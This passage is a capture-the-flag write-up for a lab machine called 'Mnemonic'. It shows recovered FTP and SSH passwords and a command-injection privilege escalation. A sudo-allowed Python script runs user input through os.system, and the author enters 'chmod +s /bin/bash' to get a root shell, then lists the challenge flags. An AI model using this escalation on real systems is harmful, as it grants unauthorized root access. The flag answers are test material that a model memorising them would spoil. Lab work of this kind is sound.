┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ls
6450.txt  james_hash.txt  note.txt  t.jpg
id_rsa    Mnemonic        not.txt
                                                               
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ mv t.jpg /home/witty 

there were 1 error I corrected

# Increase the limit for integer string conversion
    sys.set_int_max_str_digits(100000)

like this

for kelime in sayilar:
    
    # Increase the limit for integer string conversion
    sys.set_int_max_str_digits(100000)

    x = str(random.randrange(0, 1))
    print("\n\nProcessing:" + x + ".txt'dir.\n\n")
    print("*" * 15, "PROCESS COMPLETED", "*" * 15)

    with open("%s.txt" % x, "w")as f:
        for item in sayilar:
            f.write("%s" % item)

print(colored("Image Analysis Completed Successfully. Your Special Code:",'green'))
print(colored(sayilar,'red'))

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ python3 Mnemonic.py 


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:/home/witty/Downloads/mnemonic/backups/Mnemonic/image/maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[18040524736954552171240290634275910766959300482314707502901100419741398548965224725941021802487032836173634780850941582665145982921504858872321671604862829564607684810526492066226402684287616853873210669999061793585789130700435803828790107520566469792840943480312282503452757516106152078159427180240005535346255332508553204437788143156338915508366294152127113927707875461041975995380102488277249004978168150375226943402813101473129934947391047550289946960484563830077512150922589946415843574688787885125530961139010129215262707445950279859171570703824082806870131361331767370463043186684480807380022655925970022578263260441484625103975073440016327873803686977341928854134976378773600501106381048323122645504600352672462576003715628729391078556691378514984869667325662681952842565476861053690293969966782880123327168780763438531971993188949492933279982487685918120778097782850287929842115690724987096321703212163060333224283284977289802827842879042839640262338746553035294867669059625954075656244962808053213786680390708256762450366138601087542331279508299395275052543712662356328041378219046371806187926898951884853219678957425819999274422457001222309298609639251426093640939141057849874336447995977756479546186718050005298641912474325522605377986224192640694882228380343957998739955025989717286813486502685888047917180755315870714390211946645377824808166849789179435231274421467146198503514028811829300781004919877657049378435667265681319881668251241048231624460484807297038652817741869560603973762676697915583148823703700356493329862580202524500957554509421887074199100294146498732117768932143672904961738653833526638191846440214708821866139175026618637297264825003345892737942605429893574715451387924833678705133789951929605852462681960477345012953624020311976391557709788081555805657631766992810607938136910032486660007651564422670123805991173718718054421178052348944476392816000024581612574082946930065731550351831453219624684151953579510511728103358957331905212408878550039564212574718137567251206027830512330028065065453978937864280959609862513771190784012965669450685145037267642052364077110425690327182134221410979503542884860706732849934129978585114218727611818535870279929449601149898359095286920635366467549708130906749543661896923083187366061909026289661930922600092201579516609661082432775711870335549545629510027691594227860730612243143186998690675558933362090484506118561221209707766409716340182306372820967200382582924543624088571734200353648616261606529316446377770014092636693341125452946580955407629142994557330066002481203213159235316398381340305331731160166517666856882223390348124513308977825051988793237597836987360929298623246303189249691856582689010276308942286830178274172390838724707574971941901952561981824488910046853278229420504365442198918541710225781407434471906744193785133373312799582855296856950856709835659758219138879225768326613692361174053301275224320175854389113874050923227343996320199043477174610191600388011901437299832085638741402321326712525403656134611009999653962145807100825283090403287783417942602115287432675425286401345041435462570643325863310648377212678849664669288738489546673696702139852781071024689212032925750241891326917244780892553526540693621507023878116197492063762724742734661528704061416514721525046633306388371457285426394045190956663884196393567921829300941889216301986124323562132630534219703037020584372302571474382440496441398574114480957204383033321943262503608350362011371242523468860301325689572145533367049207144001883042555930629828285092657187665911761012561666252765177388099698738547128081854538124632051019468014403510598252793989911273187304833487586015420746231436325474874148965434852180676060928100023644313812181795987232910338830331055834729510404938346846471989919015845599795735768790939643391619284305838250318876707485538128176905275930727621806314457956616994759990987819253690544858857585770580235516943059089670589008382216490392151650577917337444115061483517261902983890208304334109451908984031069448924459901518438359206228316357104747954666210709949514348792360318304939151977453561590231001285752786268039570819276963721730449210149230489645405656043361846832132327771993274964709698856004767446608538370095610585587983434524982269314296208590747643797536711604753777854347516951660314747499033416983591953318141292543620399914295001181141940259724324791049457851810362242220088435283906340004174699977928565275154490289396718044511845918775172725752454755679603428250332482282444608418419550363532603974145871838290800304446059866660551988834512932996464464096290454885378463244188011655534860313546313761759397376280991585278591022593760639416075100122750488675696958867052601661035394259353669506253871127432058487776848139996130655605672187446682975840302306598400089474008139886454382608332744746601204596315835032610624779552707307670309573035414379272605351453371872703122153274147603344093748070074860459646082074018819696125737477688740729695352743137967464691424821248000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]


(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:/home/witty/Downloads/mnemonic/backups/6450.txt
 
 
 
pasificbell1981
 
 
PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE. 

```


![[Pasted image 20230707151049.png]]

ftp user name?

*ftpuser*

ftp password?

*love4ever*

What is the ssh username?

*james*

What is the ssh password?  

*bluelove*

What is the condor password?

mnemonic encryption "image based"

*pasificbell1981*

### Task 4  Hack the machine

```
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups/Mnemonic]
└─$ ssh condor@10.10.188.13 -p1337
condor@10.10.188.13's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  7 20:39:18 UTC 2023

  System load:  0.0                Processes:           93
  Usage of /:   34.3% of 12.01GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.188.13
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 14 17:58:10 2020 from 192.168.1.6
condor@mnemonic:~$ id
uid=1002(condor) gid=1002(condor) groups=1002(condor)
condor@mnemonic:~$ ls
'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''

condor@mnemonic:~$ which $SHELL
/bin/bash

condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py

condor@mnemonic:~$ cat /bin/examplecode.py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
                      

		if select == 5:                     #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)




		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)

                      
              


       


            

def info():                         #info print function
	print("""

	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()


if select == 0: 
	time.sleep(1)
	ex = str(input("are you sure you want to quit ? yes : "))
	if ex == ".":
        print(os.system(input("\nRunning....")))
	if ex == "yes " or "y":
	   sys.exit()


condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py


	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	

Select:0
are you sure you want to quit ? yes : .

Running....chmod +s /bin/bash
0
condor@mnemonic:~$ /bin/bash -p
bash-4.4# cd /root
bash-4.4# ls
f2.txt	root.txt
bash-4.4# cat root.txt 
THM{congratulationsyoumadeithashme}
bash-4.4# cat f2.txt 
b' 20:43:06 up  1:18,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ncondor   pts/0    10.8.19.103      20:39    7.00s  0.04s  0.01s sshd: condor [priv] \n'

https://www.md5hashgenerator.com/

THM{2a4825f50b0c16636984b448669b0586}

```

Answer the questions below

  
user.txt

*THM{a5f82a00e2feee3465249b855be71c01}*

  
root.txt

*THM{congratulationsyoumadeithashme}*


[[Super-Spam]]